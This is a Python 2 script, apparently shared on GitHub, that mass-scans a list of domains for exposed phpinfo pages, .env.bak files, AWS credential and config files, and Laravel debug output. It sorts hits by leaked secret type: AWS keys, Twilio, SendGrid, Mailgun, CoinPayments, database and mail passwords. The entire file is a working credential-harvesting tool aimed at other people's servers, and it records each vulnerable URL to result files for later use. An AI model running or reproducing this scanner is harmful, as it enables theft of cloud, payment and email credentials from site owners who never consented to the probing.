# -*- coding: utf-8 -*-
# 
#
# @Author : Suhada still alive <3 # JANGAN DIGANTI KONTOL
# @Github : github.com/zerobyte-id
#
#
import threading
import requests
import re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer

def AWSLO(DOMAIN):
    try:
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        if not re.match('(?:http|https)://', DOMAIN):
            print "HADEH"
        
        else:
            HADEH = "{}_profiler/phpinfo".format(DOMAIN)
            REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
            if "PHP Variables" in REQ.text and "Environment" in REQ.text:
                if "AKIA" in REQ.text:
                    print "[XXX] FOUND AWS {}".format(HADEH)
                    SIMPEN = open("RESULT-AWS.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "TWILIO" in REQ.text or "twilio" in REQ.text:
                    print "[XXX] FOUND TWILIO {}".format(HADEH)
                    SIMPEN = open("RESULT-TWILIO.txt", "a+")
                    SIMPEN.write(HADEH+"\n")
                
                elif "PLIVO" in REQ.text or "plivo" in REQ.text:
                    print "[XXX] FOUND PLIVO {}".format(HADEH)
                    SIMPEN = open("RESULT-PLIVO.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "NEXMO" in REQ.text or "nexmo" in REQ.text:
                    print "[XXX] FOUND NEXMO {}".format(HADEH)
                    SIMPEN = open("RESULT-NEXMO.txt", "a+")
                    SIMPEN.write(HADEH+"\n")
                
                elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:
                    print "[XXX] FOUND COINPAYMENTS {}".format(HADEH)
                    SIMPEN = open("RESULT-COINPAYMENTS.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "SG." in REQ.text or "sendgrid" in REQ.text:
                    print "[XXX] FOUND SENDGRID {}".format(HADEH)
                    SIMPEN = open("RESULT-SENDGRID.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "mailgun" in REQ.text:
                    print "[XXX] FOUND MAILGUN {}".format(HADEH)
                    SIMPEN = open("RESULT-MAILGUN.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "office365" in REQ.text:
                    print "[XXX] FOUND OFFICE365 {}".format(HADEH)
                    SIMPEN = open("RESULT-OFFICE365.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "ionos" in REQ.text:
                    print "[XXX] FOUND IONOS {}".format(HADEH)
                    SIMPEN = open("RESULT-IONOS.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "mandrillapp" in REQ.text:
                    print "[XXX] FOUND MANDRILL {}".format(HADEH)
                    SIMPEN = open("RESULT-MANDRILL.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                elif "MAIL_PASSWORD" in REQ.text:
                    print "[XXX] FOUND MAIL OTHER {}".format(HADEH)
                    SIMPEN = open("RESULT-MAIL-OTHER.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

                else:
                    if "DB_USERNAME" in REQ.text:
                        print "[XOX] FOUND DATABASE"
                        SIMPEN = open("RESULT-DATABASE.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    print "[XXX] FOUND PHPINFO {}".format(HADEH)
                    SIMPEN = open("RESULT-VARIABLE.txt", "a+")
                    SIMPEN.write(HADEH+"\n")

            else:
                HADEH = "{}phpinfo.php".format(DOMAIN)
                REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                if "PHP Variables" in REQ.text and "Environment" in REQ.text:
                    if "AKIA" in REQ.text:
                        print "[XXX] FOUND AWS {}".format(HADEH)
                        SIMPEN = open("RESULT-AWS.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    elif "TWILIO" in REQ.text or "twilio" in REQ.text:
                        print "[XXX] FOUND TWILIO {}".format(HADEH)
                        SIMPEN = open("RESULT-TWILIO.txt", "a+")
                        SIMPEN.write(HADEH+"\n")
                    
                    elif "PLIVO" in REQ.text or "plivo" in REQ.text:
                        print "[XXX] FOUND PLIVO {}".format(HADEH)
                        SIMPEN = open("RESULT-PLIVO.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    elif "NEXMO" in REQ.text or "nexmo" in REQ.text:
                        print "[XXX] FOUND NEXMO {}".format(HADEH)
                        SIMPEN = open("RESULT-NEXMO.txt", "a+")
                        SIMPEN.write(HADEH+"\n")
                    
                    elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:
                        print "[XXX] FOUND COINPAYMENTS {}".format(HADEH)
                        SIMPEN = open("RESULT-COINPAYMENTS.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    elif "SG." in REQ.text or "sendgrid" in REQ.text:
                        print "[XXX] FOUND SENDGRID {}".format(HADEH)
                        SIMPEN = open("RESULT-SENDGRID.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    elif "mailgun" in REQ.text:
                        print "[XXX] FOUND MAILGUN {}".format(HADEH)
                        SIMPEN = open("RESULT-MAILGUN.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    elif "office365" in REQ.text:
                        print "[XXX] FOUND OFFICE365 {}".format(HADEH)
                        SIMPEN = open("RESULT-OFFICE365.txt", "a+")
                        SIMPEN.write(HADEH+"\n")
                    
                    elif "ionos" in REQ.text:
                        print "[XXX] FOUND IONOS {}".format(HADEH)
                        SIMPEN = open("RESULT-IONOS.txt", "a+")
                        SIMPEN.write(HADEH+"\n")
                    elif "mandrillapp" in REQ.text:
                        print "[XXX] FOUND MANDRILL {}".format(HADEH)
                        SIMPEN = open("RESULT-MANDRILL.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    elif "MAIL_PASSWORD" in REQ.text:
                        print "[XXX] FOUND MAIL OTHER {}".format(HADEH)
                        SIMPEN = open("RESULT-MAIL-OTHER.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                    else:
                        if "DB_USERNAME" in REQ.text:
                            print "[XOX] FOUND DATABASE"
                            SIMPEN = open("RESULT-DATABASE.txt", "a+")
                            SIMPEN.write(HADEH+"\n")
                            
                        print "[XXX] FOUND PHPINFO {}".format(HADEH)
                        SIMPEN = open("RESULT-VARIABLE.txt", "a+")
                        SIMPEN.write(HADEH+"\n")

                else:
                    HADEH = "{}phpinfo".format(DOMAIN)
                    REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                    if "PHP Variables" in REQ.text and "Environment" in REQ.text:
                        if "AKIA" in REQ.text:
                            print "[XXX] FOUND AWS {}".format(HADEH)
                            SIMPEN = open("RESULT-AWS.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "TWILIO" in REQ.text or "twilio" in REQ.text:
                            print "[XXX] FOUND TWILIO {}".format(HADEH)
                            SIMPEN = open("RESULT-TWILIO.txt", "a+")
                            SIMPEN.write(HADEH+"\n")
                        
                        elif "PLIVO" in REQ.text or "plivo" in REQ.text:
                            print "[XXX] FOUND PLIVO {}".format(HADEH)
                            SIMPEN = open("RESULT-PLIVO.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "NEXMO" in REQ.text or "nexmo" in REQ.text:
                            print "[XXX] FOUND NEXMO {}".format(HADEH)
                            SIMPEN = open("RESULT-NEXMO.txt", "a+")
                            SIMPEN.write(HADEH+"\n")
                        
                        elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:
                            print "[XXX] FOUND COINPAYMENTS {}".format(HADEH)
                            SIMPEN = open("RESULT-COINPAYMENTS.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "SG." in REQ.text or "sendgrid" in REQ.text:
                            print "[XXX] FOUND SENDGRID {}".format(HADEH)
                            SIMPEN = open("RESULT-SENDGRID.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "mailgun" in REQ.text:
                            print "[XXX] FOUND MAILGUN {}".format(HADEH)
                            SIMPEN = open("RESULT-MAILGUN.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "office365" in REQ.text:
                            print "[XXX] FOUND OFFICE365 {}".format(HADEH)
                            SIMPEN = open("RESULT-OFFICE365.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "ionos" in REQ.text:
                            print "[XXX] FOUND IONOS {}".format(HADEH)
                            SIMPEN = open("RESULT-IONOS.txt", "a+")
                            SIMPEN.write(HADEH+"\n")
                        elif "mandrillapp" in REQ.text:
                            print "[XXX] FOUND MANDRILL {}".format(HADEH)
                            SIMPEN = open("RESULT-MANDRILL.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        elif "MAIL_PASSWORD" in REQ.text:
                            print "[XXX] FOUND MAIL OTHER {}".format(HADEH)
                            SIMPEN = open("RESULT-MAIL-OTHER.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        else:
                            if "DB_USERNAME" in REQ.text:
                                print "[XOX] FOUND DATABASE"
                                SIMPEN = open("RESULT-DATABASE.txt", "a+")
                                SIMPEN.write(HADEH+"\n")
                                
                            print "[XXX] FOUND PHPINFO {}".format(HADEH)
                            SIMPEN = open("RESULT-VARIABLE.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                    else:
                        HADEH = "{}aws.yml".format(DOMAIN)
                        REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                        if "[default]" in REQ.text and "AKIA" in REQ.text:
                            print "[XXX] FOUND AWS {}".format(HADEH)
                            SIMPEN = open("RESULT-AWS.txt", "a+")
                            SIMPEN.write(HADEH+"\n")

                        else:
                            HADEH = "{}.env.bak".format(DOMAIN)
                            REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                            if "APP_KEY" in REQ.text:
                                if "AKIA" in REQ.text:
                                    print "[XXX] FOUND AWS {}".format(HADEH)
                                    SIMPEN = open("RESULT-AWS.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "TWILIO" in REQ.text or "twilio" in REQ.text:
                                    print "[XXX] FOUND TWILIO {}".format(HADEH)
                                    SIMPEN = open("RESULT-TWILIO.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")
                                
                                elif "PLIVO" in REQ.text or "plivo" in REQ.text:
                                    print "[XXX] FOUND PLIVO {}".format(HADEH)
                                    SIMPEN = open("RESULT-PLIVO.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "NEXMO" in REQ.text or "nexmo" in REQ.text:
                                    print "[XXX] FOUND NEXMO {}".format(HADEH)
                                    SIMPEN = open("RESULT-NEXMO.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")
                                
                                elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:
                                    print "[XXX] FOUND COINPAYMENTS {}".format(HADEH)
                                    SIMPEN = open("RESULT-COINPAYMENTS.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "SG." in REQ.text or "sendgrid" in REQ.text:
                                    print "[XXX] FOUND SENDGRID {}".format(HADEH)
                                    SIMPEN = open("RESULT-SENDGRID.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "mailgun" in REQ.text:
                                    print "[XXX] FOUND MAILGUN {}".format(HADEH)
                                    SIMPEN = open("RESULT-MAILGUN.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "office365" in REQ.text:
                                    print "[XXX] FOUND OFFICE365 {}".format(HADEH)
                                    SIMPEN = open("RESULT-OFFICE365.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "ionos" in REQ.text:
                                    print "[XXX] FOUND IONOS {}".format(HADEH)
                                    SIMPEN = open("RESULT-IONOS.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "mandrillapp" in REQ.text:
                                    print "[XXX] FOUND MANDRILL {}".format(HADEH)
                                    SIMPEN = open("RESULT-MANDRILL.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                elif "MAIL_PASSWORD" in REQ.text:
                                    print "[XXX] FOUND MAIL OTHER {}".format(HADEH)
                                    SIMPEN = open("RESULT-MAIL-OTHER.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                                else:
                                    print "[XXX] FOUND PHPINFO {}".format(HADEH)
                                    SIMPEN = open("RESULT-VARIABLE.txt", "a+")
                                    SIMPEN.write(HADEH+"\n")

                            else:
                                HADEH = "{}info.php".format(DOMAIN)
                                REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                                if "PHP Variables" in REQ.text and "Environment" in REQ.text:
                                    if "AKIA" in REQ.text:
                                        print "[XXX] FOUND AWS {}".format(HADEH)
                                        SIMPEN = open("RESULT-AWS.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "TWILIO" in REQ.text or "twilio" in REQ.text:
                                        print "[XXX] FOUND TWILIO {}".format(HADEH)
                                        SIMPEN = open("RESULT-TWILIO.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")
                                    
                                    elif "PLIVO" in REQ.text or "plivo" in REQ.text:
                                        print "[XXX] FOUND PLIVO {}".format(HADEH)
                                        SIMPEN = open("RESULT-PLIVO.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "NEXMO" in REQ.text or "nexmo" in REQ.text:
                                        print "[XXX] FOUND NEXMO {}".format(HADEH)
                                        SIMPEN = open("RESULT-NEXMO.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")
                                    
                                    elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:
                                        print "[XXX] FOUND COINPAYMENTS {}".format(HADEH)
                                        SIMPEN = open("RESULT-COINPAYMENTS.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "SG." in REQ.text or "sendgrid" in REQ.text:
                                        print "[XXX] FOUND SENDGRID {}".format(HADEH)
                                        SIMPEN = open("RESULT-SENDGRID.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "mailgun" in REQ.text:
                                        print "[XXX] FOUND MAILGUN {}".format(HADEH)
                                        SIMPEN = open("RESULT-MAILGUN.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "office365" in REQ.text:
                                        print "[XXX] FOUND OFFICE365 {}".format(HADEH)
                                        SIMPEN = open("RESULT-OFFICE365.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "ionos" in REQ.text:
                                        print "[XXX] FOUND IONOS {}".format(HADEH)
                                        SIMPEN = open("RESULT-IONOS.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")
                                    elif "mandrillapp" in REQ.text:
                                        print "[XXX] FOUND MANDRILL {}".format(HADEH)
                                        SIMPEN = open("RESULT-MANDRILL.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    elif "MAIL_PASSWORD" in REQ.text:
                                        print "[XXX] FOUND MAIL OTHER {}".format(HADEH)
                                        SIMPEN = open("RESULT-MAIL-OTHER.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    else:
                                        if "DB_USERNAME" in REQ.text:
                                            print "[XOX] FOUND DATABASE"
                                            SIMPEN = open("RESULT-DATABASE.txt", "a+")
                                            SIMPEN.write(HADEH+"\n")
                                            
                                        print "[XXX] FOUND PHPINFO {}".format(HADEH)
                                        SIMPEN = open("RESULT-VARIABLE.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                else:
                                    ### Missconfigure aws credentials
                                    HADEH = "{}.aws/credentials".format(DOMAIN)
                                    REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                                    if "[default]" in REQ.text and "AKI" in REQ.text:
                                        print "[XXX] FOUND AWS {}".format(HADEH)
                                        SIMPEN = open("RESULT-AWS.txt", "a+")
                                        SIMPEN.write(HADEH+"\n")

                                    else:
                                        ### Missconfigure admin
                                        HADEH = "{}".format(DOMAIN)
                                        REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                                        if "AKIA" in REQ.text and "accessKeyId" in REQ.text:
                                            print "[XXX] FOUND AWS {}".format(HADEH)
                                            SIMPEN = open("RESULT-AWS.txt", "a+")
                                            SIMPEN.write(HADEH+"\n")

                                        else:
                                            ### Missconfigure aws
                                            HADEH = "{}config/aws.yml".format(DOMAIN)
                                            REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                                            if "AKI" in REQ.text and "access_key_id" in REQ.text:
                                                print "[XXX] FOUND AWS {}".format(HADEH)
                                                SIMPEN = open("RESULT-AWS.txt", "a+")
                                                SIMPEN.write(HADEH+"\n")

                                            else:
                                                ### DEBUG LARAVEL
                                                HADEH = "{}".format(DOMAIN)
                                                HPOST = {'somekey': 'somevalue'}
                                                REQ = requests.get(HADEH, headers=headers, data=HPOST, allow_redirects=True, timeout=3)
                                                if "APP_KEY" in REQ.text:
                                                    if "AKIA" in REQ.text:
                                                        print "[XXX] FOUND AWS {}".format(HADEH)
                                                        SIMPEN = open("RESULT-AWS.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    elif "TWILIO" in REQ.text or "twilio" in REQ.text:
                                                        print "[XXX] FOUND TWILIO {}".format(HADEH)
                                                        SIMPEN = open("RESULT-TWILIO.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")
                                                    
                                                    elif "PLIVO" in REQ.text or "plivo" in REQ.text:
                                                        print "[XXX] FOUND PLIVO {}".format(HADEH)
                                                        SIMPEN = open("RESULT-PLIVO.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    elif "NEXMO" in REQ.text or "nexmo" in REQ.text:
                                                        print "[XXX] FOUND NEXMO {}".format(HADEH)
                                                        SIMPEN = open("RESULT-NEXMO.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")
                                                    
                                                    elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:
                                                        print "[XXX] FOUND COINPAYMENTS {}".format(HADEH)
                                                        SIMPEN = open("RESULT-COINPAYMENTS.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    elif "SG." in REQ.text or "sendgrid" in REQ.text:
                                                        print "[XXX] FOUND SENDGRID {}".format(HADEH)
                                                        SIMPEN = open("RESULT-SENDGRID.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    elif "mailgun" in REQ.text:
                                                        print "[XXX] FOUND MAILGUN {}".format(HADEH)
                                                        SIMPEN = open("RESULT-MAILGUN.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    elif "office365" in REQ.text:
                                                        print "[XXX] FOUND OFFICE365 {}".format(HADEH)
                                                        SIMPEN = open("RESULT-OFFICE365.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    elif "ionos" in REQ.text:
                                                        print "[XXX] FOUND IONOS {}".format(HADEH)
                                                        SIMPEN = open("RESULT-IONOS.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")
                                                        
                                                    elif "mandrillapp" in REQ.text:
                                                        print "[XXX] FOUND MANDRILL {}".format(HADEH)
                                                        SIMPEN = open("RESULT-MANDRILL.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")
                                                        
                                                    elif "MAIL_PASSWORD" in REQ.text:
                                                        print "[XXX] FOUND MAIL OTHER {}".format(HADEH)
                                                        SIMPEN = open("RESULT-MAIL-OTHER.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")

                                                    else:
                                                        print "[XXX] FOUND PHPINFO {}".format(HADEH)
                                                        SIMPEN = open("RESULT-VARIABLE.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")
                                                else:
                                                    HADEH = "{}config.js".format(DOMAIN)
                                                    REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)
                                                    if "ASIA" in REQ.text and "accessKeyId" in REQ.text and "AKIA" in REQ.text:
                                                        print "[XXX] FOUND AWS {}".format(HADEH)
                                                        SIMPEN = open("RESULT-AWS.txt", "a+")
                                                        SIMPEN.write(HADEH+"\n")
                                                    else:
                                                        print "[YXGKUY] NOT FOUND BUG {}".format(DOMAIN)
                                                    
    except:
        pass
def main():
    try:
        MULAI = timer()
        PP = ThreadPool(THREAD)
        PR = PP.map(AWSLO, DOMAIN)
        PR.join()
    except:
        pass

try:
    LIST = raw_input(" [ - ] Input your file domain list : ")
    THREAD = input(" [ - ] Input your Thread : ")
    DOMAIN = open(LIST, "r").read().split()
except IOError:
    pass

main()


